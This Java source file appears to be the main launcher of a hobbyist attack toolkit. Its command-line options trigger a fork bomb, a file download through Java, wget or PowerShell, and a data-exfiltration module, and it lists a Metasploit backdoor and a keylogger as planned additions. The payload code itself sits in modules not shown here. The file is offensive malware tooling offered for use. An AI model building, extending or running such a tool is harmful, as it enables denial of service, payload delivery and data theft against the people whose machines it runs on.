import Modules.*;

public class Application {

    public static void main(String[] args) {
        double version = 2.2;

        if (args.length == 0) {
            new Art();
            System.out.println("Made by: Cromble");
            System.out.println("Version: " + version);
            System.out.println();
            help();
            return;
        }

        // Aliases
        String firstArg = args[0].toLowerCase();
        if (firstArg.equals("--help") || firstArg.equals("?")) firstArg = "-h";
        if (firstArg.equals("--forkbomb")) firstArg = "-fb";
        if (firstArg.equals("--download")) firstArg = "-dl";
        if (firstArg.equals("--data-exfil")) firstArg = "-de";
        // Todo
        // if (firstArg.equals("--msf-backdoor")) firstArg = "-bd";
        // if (firstArg.equals("--keylogger")) firstArg = "-kl";

        switch (firstArg) {
            case "-h":
                help();
                break;

            case "-fb":
                new ForkBomb();
                break;

            case "-dl":
                if (!(args.length >= 3)) System.out.println("-dl URL NAME (--java | --wget | --ps [default])");
                if (!new Exists().exists(args[1])) System.out.println("This site does not exist!");

                else if (args.length == 4 && !args[3].equals("--ps"))
                    new Download(args[1], args[2], args[3]);
                else new Download(args[1], args[2], "");
                break;

            case "-de":
                new DataExfiltration();
                break;

//            case "-bd":
//                // Todo
//                break;
//            case "-kl":
//                // Todo
//                break;

            default:
                System.out.println("That's not a valid argument, type '--help' for help");
        }
    }

    public static void help() {
        System.out.println("Commands:");
        System.out.println("--help          | -h    | ?");
        System.out.println("--forkbomb      | -fb");
        System.out.println("--download      | -dl (--java| --wget| --ps [default] | --linux)");
        System.out.println("--data-exfil    | -de");
//        System.out.println("--msf-backdoor  | -bd");
//        System.out.println("--keylogger     | -kl");
    }
}
